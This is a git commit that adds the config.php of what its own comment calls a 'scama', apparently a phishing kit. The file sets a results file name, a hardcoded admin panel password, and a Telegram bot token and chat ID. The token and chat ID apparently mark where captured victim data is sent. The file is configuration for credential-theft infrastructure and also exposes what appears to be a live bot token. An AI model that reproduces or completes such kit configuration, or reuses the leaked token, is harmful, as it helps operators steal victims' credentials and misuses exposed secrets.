0bff395f2b138afe703c5536af634e1e23f97972
HELLBOY12Y <77193185+HELLBOY12Y@users.noreply.github.com>
2023-02-04 01:42:10 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,9 @@
+<?php
+// setting scama
+$yourmail  = "";  // your email 
+$namerand = "rzlt";  // name for file rzult *
+$pass = "123345"; // pass admin panel
+$botToken="5337481738:AAGEfKoa858gnMH9_Og8dqXH7uldManQn70"; // token bot telegram
+$chatId="-2094460569";  // chatId telegram
+
+?>
